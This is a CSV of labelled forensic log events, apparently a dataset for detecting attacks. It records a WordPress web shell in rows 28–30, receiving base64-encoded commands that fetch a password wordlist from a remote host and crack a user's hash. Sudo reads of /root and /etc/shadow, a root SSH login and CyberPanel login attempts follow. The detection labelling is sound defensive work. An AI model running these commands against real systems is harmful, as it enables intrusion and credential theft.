event_id,datetime,timestamp_desc,source,source_long,message,parser,display_name,tag,normalized,actor,decoded,label_candidates,label_predict
28,2022-01-18T12:39:03.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""tar"", ""xvfz"", ""v0.1.tar.gz""]]",HTTP Request with Suspicious User Agent[medium] | File Resource Commands in HTTP Request[high],File Resource Commands in HTTP Request[high]
29,2022-01-18T12:39:06.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHA6Ly8xOTIuMTY4LjEzMC43Ny9yb2NreW91LnR4dCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHA6Ly8xOTIuMTY4LjEzMC43Ny9yb2NreW91LnR4dCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHA6Ly8xOTIuMTY4LjEzMC43Ny9yb2NreW91LnR4dCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""wget"", ""http://192.168.130.77/rockyou.txt""]]",HTTP Request with Suspicious User Agent[medium] | File Resource Commands in HTTP Request[high],File Resource Commands in HTTP Request[high]
30,2022-01-18T12:39:11.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""./wphashcrack-0.1/wphashcrack.sh"", ""-w"", ""$PWD/rockyou.txt"", ""-j"", ""./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run"", ""-u"", ""phopkins""]]",HTTP Request with Suspicious User Agent[medium] | Shell Script Execution Commands in HTTP Request[critical],Shell Script Execution Commands in HTTP Request[critical]
31,2022-01-18T12:39:01.000000+00:00,Content Modification Time,LOG,Log File,[sudo] phopkins : TTY=pts/0 ; PWD=/home/phopkins ; USER=root ; COMMAND=/usr/bin/tail /var/log/syslog,text/syslog_traditional,OS:evidences\\\\auth.log,-,[sudo] phopkins : TTY=pts/0 ; PWD=/home/phopkins ; USER=root ; COMMAND=/usr/bin/tail /var/log/syslog,phopkins,[sudo] phopkins : TTY=pts/0 ; PWD=/home/phopkins ; USER=root ; COMMAND=/usr/bin/tail /var/log/syslog,benign,benign
32,2022-01-18T13:14:41.000000+00:00,Content Modification Time,LOG,Log File,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list,text/syslog_traditional,OS:evidences\\\\auth.log,-,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list,phopkins,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list,Sudo Command Executed in Web Directory[high],Sudo Command Executed in Web Directory[high]
33,2022-01-18T13:14:43.000000+00:00,Content Modification Time,LOG,Log File,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/,text/syslog_traditional,OS:evidences\\\\auth.log,-,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/,phopkins,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/,Sudo Command Executed in Web Directory[high] | Sudo List Command Executed from Web Directory[critical],Sudo List Command Executed from Web Directory[critical]
34,2022-01-18T13:14:49.000000+00:00,Content Modification Time,LOG,Log File,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow,text/syslog_traditional,OS:evidences\\\\auth.log,-,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow,phopkins,[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow,Sudo Command Executed in Web Directory[high] | Sudo Read Command Executed from Web Directory[critical],Sudo Read Command Executed from Web Directory[critical]
35,2022-01-18T13:14:50.000000+00:00,Content Modification Time,LOG,Log File,[sudo] jwilkinson : TTY=pts/1 ; PWD=/var/www/intranet.hallbrown.wilson.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/sbin/iptables -L,text/syslog_traditional,OS:/mnt/d/0experiment/1-1-plaso-sec/data-p-ait-v2-wilson/evidences/auth.log,-,[sudo] jwilkinson : TTY=pts/1 ; PWD=/var/www/intranet.hallbrown.wilson.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/sbin/iptables -L,jwilkinson,[sudo] jwilkinson : TTY=pts/1 ; PWD=/var/www/intranet.hallbrown.wilson.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/sbin/iptables -L,Sudo Command Executed in Web Directory[high] | Sudo Network Command Executed from Web Directory[critical],Sudo Network Command Executed from Web Directory[critical]
36,2025-04-29T05:28:24.000000+00:00,Content Modification Time,LOG,Log File,[sshd] [942042]: Connection closed by 243.23.54.175 port 41316,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[sshd] [942042]: Connection closed by 243.23.54.175 port 41316,243.23.54.175,[sshd] [942042]: Connection closed by 243.23.54.175 port 41316,benign,benign
37,2025-04-29T05:35:51.000000+00:00,Content Modification Time,LOG,Log File,[sshd] [943610]: Accepted password for root from 243.23.54.175 port 37190 ssh2,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[sshd] [943610]: Accepted password for root from 243.23.54.175 port 37190 ssh2,243.23.54.175,[sshd] [943610]: Accepted password for root from 243.23.54.175 port 37190 ssh2,User Login Activity in Server[medium],User Login Activity in Server[medium]
38,2025-04-29T05:35:51.000000+00:00,Content Modification Time,LOG,Log File,[systemd-logind  pid: 623] New session 44433 of user root.,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[systemd-logind  pid: 623] New session 44433 of user root.,root,[systemd-logind  pid: 623] New session 44433 of user root.,User Login Activity in Server[medium],User Login Activity in Server[medium]
39,2025-04-29T05:35:52.000000+00:00,Content Modification Time,LOG,Log File,[sshd] [943610]: Disconnected from user root 243.23.54.175 port 37190,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[sshd] [943610]: Disconnected from user root 243.23.54.175 port 37190,243.23.54.175,[sshd] [943610]: Disconnected from user root 243.23.54.175 port 37190,benign,benign
40,2025-04-29T05:39:25.000000+00:00,Content Modification Time,LOG,Log File,[sshd] [944407]: Received disconnect from 243.23.54.175 port 34402:11: disconnected by user,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[sshd] [944407]: Received disconnect from 243.23.54.175 port 34402:11: disconnected by user,243.23.54.175,[sshd] [944407]: Received disconnect from 243.23.54.175 port 34402:11: disconnected by user,benign,benign
41,2025-04-29T05:46:59.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /static/baseTemplate/assets/finalLoginPageCSS/200.css HTTP/1.1 from: 243.23.54.175 code: 200 referer: https://71.34.77.74:8090/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36,text/apache_access,OS:D:\0experiment\1-1-plaso-sec\data\evidences\usr\local\lscp\cyberpanel\logs\access.log,-,http_request: GET /static/baseTemplate/assets/finalLoginPageCSS/200.css HTTP/1.1 from: 243.23.54.175 code: 200 referer: https://71.34.77.74:8090/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36,243.23.54.175,http_request: GET /static/baseTemplate/assets/finalLoginPageCSS/200.css HTTP/1.1 from: 243.23.54.175 code: 200 referer: https://71.34.77.74:8090/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36,benign,benign
42,2025-04-29T05:47:14.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: POST /verifyLogin HTTP/1.1 from: 243.23.54.175 code: 200 referer: https://71.34.77.74:8090/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36,text/apache_access,OS:D:\0experiment\1-1-plaso-sec\data\evidences\usr\local\lscp\cyberpanel\logs\access.log,-,http_request: POST /verifyLogin HTTP/1.1 from: 243.23.54.175 code: 200 referer: https://71.34.77.74:8090/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36,243.23.54.175,http_request: POST /verifyLogin HTTP/1.1 from: 243.23.54.175 code: 200 referer: https://71.34.77.74:8090/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36,Login Cyberpanel Attempts[high],Login Cyberpanel Attempts[high]
43,2025-04-29T06:05:31.000000+00:00,Content Modification Time,LOG,Log File,[sshd] [951322]: Failed password for root from 71.238.128.110 port 54700 ssh2,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[sshd] [951322]: Failed password for root from 71.238.128.110 port 54700 ssh2,71.238.128.110,[sshd] [951322]: Failed password for root from 71.238.128.110 port 54700 ssh2,SSH Failed Login Attempt[medium],SSH Failed Login Attempt[medium]
44,2025-04-29T06:05:31.000000+00:00,Content Modification Time,LOG,Log File,[passwd] [951308]: pam_unix(passwd:chauthtok): password changed for webadmin_cyberpanel,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[passwd] [951308]: pam_unix(passwd:chauthtok): password changed for webadmin_cyberpanel,webadmin_cyberpanel,[passwd] [951308]: pam_unix(passwd:chauthtok): password changed for webadmin_cyberpanel,Password Change Activity[high],Password Change Activity[high]
45,2025-04-29T06:05:32.000000+00:00,Content Modification Time,LOG,Log File,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by (uid=0),text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by (uid=0),phopkins,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by (uid=0),benign,benign
46,2025-04-29T06:05:33.000000+00:00,Content Modification Time,LOG,Log File,[dbus-daemon  pid: 898] [system] Reloaded configuration,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[dbus-daemon  pid: 898] [system] Reloaded configuration,-,[dbus-daemon  pid: 898] [system] Reloaded configuration,benign,benign
47,2025-04-29T06:05:34.000000+00:00,Content Modification Time,LOG,Log File,[dbus-daemon pid: 898] [system] Successfully activated service 'org.freedesktop.hostname1',text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[dbus-daemon pid: 898] [system] Successfully activated service 'org.freedesktop.hostname1',-,[dbus-daemon pid: 898] [system] Successfully activated service 'org.freedesktop.hostname1',benign,benign
48,2025-04-29T06:05:35.000000+00:00,Content Modification Time,LOG,Log File,[05efi] debug: Not on UEFI platform,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[05efi] debug: Not on UEFI platform,-,[05efi] debug: Not on UEFI platform,benign,benign
49,2025-04-29T06:05:36.000000+00:00,Content Modification Time,LOG,Log File,[83haiku] debug: /dev/vda15 is not a BeFS partition: exiting,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[83haiku] debug: /dev/vda15 is not a BeFS partition: exiting,-,[83haiku] debug: /dev/vda15 is not a BeFS partition: exiting,benign,benign
50,2025-04-29T06:05:37.000000+00:00,Content Modification Time,LOG,Log File,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by (uid=0),text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by (uid=0),phopkins,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by (uid=0),benign,benign
51,2025-04-29T06:05:38.000000+00:00,Content Modification Time,LOG,Log File,[CRON pid: 9852] pam_unix(cron:session): session closed for user root,text/syslog_traditional,OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log,-,[CRON pid: 9852] pam_unix(cron:session): session closed for user root,root,[CRON pid: 9852] pam_unix(cron:session): session closed for user root,benign,benign
